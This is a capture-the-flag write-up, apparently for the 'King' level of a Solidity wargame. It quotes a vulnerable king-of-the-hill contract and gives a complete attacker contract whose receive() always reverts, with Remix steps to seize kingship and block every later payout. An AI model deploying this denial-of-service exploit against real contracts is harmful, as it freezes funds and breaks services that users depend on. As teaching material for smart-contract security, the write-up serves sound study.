# 09 King

```
The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

#### Start 


### (1) `  avoid  reclaim kingship `
We need to find the part of the code that changes king  is the `receive()` function


So how do we prevent the reclaim kingship?

.

.

. You need to see if the code Which part can make transaction revert?

.

.


this section can make transaction revert because it will call to external contract which is can be vulnerability.

```
payable(king).transfer(msg.value);
```
The `transfer` fucntion will send ether to the external contract which will trigger external contract `fallback()` 


this allows us to create a contract to attack by writing `revert()` in our fallback() fucntion.


#### This is the code I used to attack contract King 
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface King {
  function _king() external view returns(address);
  function prize() external view returns(uint256);
}


contract AtkKing {

    function checkPrizeKing(address _kingAddress) public view returns(uint256) {
      return King(_kingAddress).prize();
    }

    function checkKing(address _kingAddress) public view returns(address) {
      return King(_kingAddress)._king();
    }


     function callKing(address _kingAddress) public payable  {
       (bool s,) = address(_kingAddress).call{value:msg.value}("");
       require(s);
    }

      receive() external payable {
        revert("avoid  reclaim kingship");
    }
}

```
- `function checkPrizeKing(address _kingAddress) public view returns(uint256)`

    This function just check Prize 

- `function checkKing(address _kingAddress) public view returns(address) `

    This function just check address King

- ` function callKing(address _kingAddress) public payable`

    This function to call `receive()` function  in contract King

- ` receive() external payable`

    This function will revert when ether is sent to this contract using the method `send` or `transfer` or `call`


Use the remix deploy contract `AtkKing`

 - (1) We have to become king first by calling `recive()` in the contract King  and must pass the conditions `require(msg.value >= prize || msg.sender == owner);`

 - (2) We need to know the  `prize` to send ether for the call  `recive()` to pass and become king

  - (3) call the function `function checkPrizeKing(address _kingAddress) public view returns(uint256)` in remix 
    
    You will see the message `0:uint256: 1000000000000000` this is `prize`

  - (4) call the function `function callKing(address _kingAddress) public payable` and set wei to 1000000000000000 in remix then  confirm transaction
  
  - (5) call the function `function checkKing(address _kingAddress) public view returns(address)` in remix 
  
     and you will see that the contract AtkKing you deployed has become king.

     From now on, anyone who attempts to become king will be completely reverted
    


Click button Submit instance and confirm transaction

# !!! we passed !!!


